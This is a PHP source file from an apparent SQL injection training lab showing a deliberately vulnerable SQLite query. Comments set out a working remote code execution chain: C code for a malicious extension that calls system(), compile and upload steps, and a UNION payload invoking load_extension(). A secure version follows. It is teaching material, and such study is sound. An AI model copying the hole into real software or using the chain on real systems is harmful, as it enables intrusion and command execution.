<?php
// ============================================================
// Lab 8: RCE: load_extension() Exploitation (Source Code)
// ============================================================
// Database: SQLite3
// File: /home/kali/SQLi-Arena/data/sqlite/lab8.db
// ============================================================

// Connection is established via includes/db.php
// $conn = new SQLite3('/home/kali/SQLi-Arena/data/sqlite/lab8.db');
// $conn->enableLoadExtension(true);  // DANGEROUS: extensions enabled!

// Tables:
//   reports(id INTEGER PRIMARY KEY, report_name TEXT, status TEXT)
//   master_secrets(id INTEGER PRIMARY KEY, secret_value TEXT)

// --- Vulnerable Code ---

$input = $_GET['report'];  // No sanitization

$query = "SELECT id, report_name, status FROM reports WHERE report_name LIKE '%$input%'";
//                                                               ^^^^^^^
//                                                User input directly concatenated!

$result = $conn->query($query);

if ($result === false) {
    echo "SQLite Error: " . $conn->lastErrorMsg();
} else {
    while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
        echo $row['id'] . ' | ' . $row['report_name'] . ' | ' . $row['status'];
    }
}

// --- load_extension() RCE Chain ---
//
// Step 1: Create a malicious shared library (evil.c):
//
//   #include <sqlite3ext.h>
//   #include <stdlib.h>
//   SQLITE_EXTENSION_INIT1
//
//   int sqlite3_extension_init(sqlite3 *db, char **pzErrMsg,
//       const sqlite3_api_routines *pApi) {
//     SQLITE_EXTENSION_INIT2(pApi);
//     system("id > /tmp/pwned.txt");  // Arbitrary command execution
//     return SQLITE_OK;
//   }
//
// Step 2: Compile: gcc -shared -fPIC -o evil.so evil.c
// Step 3: Upload evil.so to the server (via file upload, ATTACH DATABASE, etc.)
// Step 4: Inject: ' UNION SELECT 1,load_extension('/path/to/evil.so'),3 -- -
//
// The shared library is loaded and the init function executes the system command.

// --- Why is this vulnerable? ---
// 1. load_extension() is enabled on the connection
// 2. SQL injection allows calling load_extension() with an attacker-controlled path
// 3. If the attacker can place a .so file on disk, full RCE is achieved
// 4. Even without file upload, the UNION injection still allows data extraction

// --- Secure Version ---
// $conn->enableLoadExtension(false);  // Always disable in production
// $stmt = $conn->prepare("SELECT id, report_name, status FROM reports WHERE report_name LIKE :name");
// $stmt->bindValue(':name', '%' . $input . '%', SQLITE3_TEXT);
// $result = $stmt->execute();
?>
